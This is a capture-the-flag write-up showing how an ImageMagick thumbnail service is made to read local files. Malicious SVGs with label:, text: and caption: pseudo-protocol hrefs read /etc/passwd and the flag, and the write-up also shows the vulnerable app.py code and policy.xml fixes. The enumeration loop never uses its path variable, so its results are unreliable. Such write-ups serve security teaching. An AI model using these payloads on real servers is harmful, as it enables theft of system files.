# Kobeni's Dashboard — ImageMagick LFI Writeup

**CTF:** boroCTF  
**Challenge:** Kobeni's Dashboard  
**Category:** Web  
**Points:** 200  
**Flag:** `boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}`

---

## Description

> Kobeni's been tasked with cataloging devil sighting evidence through Public Safety's new imaging system, but rumor has it that contract information between the Chainsaw Devil & Denji are buried somewhere in the classified archive. Report back your findings.

A Chainsaw Man-themed file upload portal that processes uploaded images using ImageMagick.

---

## Reconnaissance

### Step 1 — Identify the Backend

The first thing to check on any file upload challenge is the response headers. After uploading a test image:

```bash
curl -v -X POST https://sj20riah2597.boroctf.com/upload \
  -F "file=@test.png" 2>&1 | grep -i "x-processor"
```

Response:
```
x-processor: ImageMagick/unknown
```

The server uses **ImageMagick** to process uploaded images. This is a critical finding.

### Step 2 — Read the Source Code

Using gobuster, `robots.txt` was found (1248 bytes — suspiciously large). More importantly, by uploading a malicious SVG (explained below), we were able to read `/app/app.py`:

```python
ext = os.path.splitext(filename)[1].lower().lstrip('.')
input_arg = '{}:{}'.format(ext, upload_path) if ext else upload_path

subprocess.run(
    ['convert', input_arg, thumb_path],
    timeout=15,
    check=False
)
```

The key vulnerability: the file extension is passed **directly** into ImageMagick's input format specifier with **zero sanitization**.

---

## Vulnerability: ImageMagick Unsanitized Delegate / LFI

ImageMagick supports **pseudo-protocols** — special URI schemes that allow reading from various sources:

| Protocol | Description |
|----------|-------------|
| `label:@/path/to/file` | Read file content and render as text image |
| `text:@/path/to/file` | Render file as text image |
| `caption:@/path/to/file` | Render file scaled to canvas size |
| `vid:glob:/path/*` | List files matching glob |

When we upload a file named `evil.svg`, the server runs:

```bash
convert svg:evil.svg thumb.png
```

And if the SVG contains an `<image>` tag with a `label:@/etc/passwd` href, ImageMagick processes it — reading arbitrary local files and rendering them as pixel data in the output image.

---

## Exploitation

### Step 1 — Confirm LFI with /etc/passwd

Upload a malicious SVG:

```xml
<?xml version="1.0" standalone="no"?>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <image href="text:@/etc/passwd" x="0" y="0" height="480px" width="640px"/>
</svg>
```

```bash
curl -s -X POST https://sj20riah2597.boroctf.com/upload \
  -F "file=@evil.svg" | \
  grep -o 'data:image/png;base64,[^"]*' | \
  sed 's/data:image\/png;base64,//' | \
  base64 -d > output.png
```

The returned PNG rendered `/etc/passwd` content as text — LFI confirmed.

### Step 2 — Enumerate Flag Locations

Test which paths return non-empty images by measuring response size:

```bash
for path in /flag.txt /app/flag /root/flag /flag /secret; do
  SIZE=$(curl -s -X POST https://sj20riah2597.boroctf.com/upload \
    -F "file=@test.svg" | \
    grep -o 'data:image/png;base64,[^"]*' | wc -c)
  echo "$path -> size: $SIZE"
done
```

Results:
```
/flag.txt -> size: 199679   ← HIT
/app/flag -> size: 432955   ← HIT
/root/flag -> size: 411987  ← HIT
```

### Step 3 — Extract the Flag

Initial attempts with `label:` and `text:` protocols rendered tiny, unreadable text. The breakthrough was using the **`caption:` protocol**, which scales text to fill the entire canvas:

```xml
<?xml version="1.0" standalone="no"?>
<svg width="4000px" height="400px" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <image href="caption:@/flag.txt" x="0" y="0" height="400px" width="4000px"/>
</svg>
```

```bash
curl -s -X POST https://sj20riah2597.boroctf.com/upload \
  -F "file=@caption_flag.svg" | \
  grep -o 'data:image/png;base64,[^"]*' | \
  sed 's/data:image\/png;base64,//' | \
  base64 -d > caption_flag.png
```

Opening `caption_flag.png` revealed:

```
boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}
```

> **Note:** The apostrophe in `I'v3` was invisible at smaller font sizes — only the `caption:` protocol, which scales text to fill the canvas, made it readable. This caused several incorrect submissions before the final solve.

---

## Key Insight: Protocol Comparison

| Protocol | Behavior | Readable? |
|----------|----------|-----------|
| `label:@/flag.txt` | Fixed small font | ❌ Too small |
| `text:@/flag.txt` | Even smaller | ❌ Too small |
| `caption:@/flag.txt` | **Scales to fill canvas** | ✅ Perfect |

---

## Vulnerability Summary

```python
# VULNERABLE (from app.py)
ext = os.path.splitext(filename)[1].lower().lstrip('.')
input_arg = '{}:{}'.format(ext, upload_path)  # e.g. "svg:/tmp/uploads/evil.svg"
subprocess.run(['convert', input_arg, thumb_path])

# When evil.svg contains: <image href="caption:@/flag.txt"/>
# ImageMagick reads /flag.txt and renders it into the thumbnail
```

**Root cause:** User-controlled file extension → unsanitized ImageMagick format specifier → SVG `<image>` href can reference arbitrary pseudo-protocols → arbitrary local file read.

---

## Fix

1. **Validate file type by magic bytes**, not extension
2. **Strip or allowlist** ImageMagick pseudo-protocols
3. **Disable dangerous delegates** in ImageMagick's `policy.xml`:

```xml
<policy domain="coder" rights="none" pattern="SVG" />
<policy domain="coder" rights="none" pattern="LABEL" />
<policy domain="coder" rights="none" pattern="TEXT" />
<policy domain="coder" rights="none" pattern="CAPTION" />
```

4. **Run ImageMagick in a sandboxed environment** with no access to sensitive files

---

## Timeline

1. Uploaded test image → spotted `x-processor: ImageMagick` header
2. Read `/app/app.py` source via LFI → confirmed unsanitized input
3. Enumerated flag file locations by response size comparison
4. Used `label:` → text too small, unreadable
5. Switched to `caption:` protocol → full canvas render → flag visible
6. Spotted hidden apostrophe in `I'v3` → correct flag submitted ✅

---

## References

- [ImageMagick Pseudo-Protocols](https://imagemagick.org/script/formats.php)
- [ImageTragick (CVE-2016-3714)](https://imagetragick.com/)
- [HackTricks: ImageMagick](https://book.hacktricks.xyz/pentesting-web/file-upload/imagemagick-security-issues)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

*Writeup by [@elkhaoudari](https://github.com/elkhaoudari) | cat0x01.vercel.app*
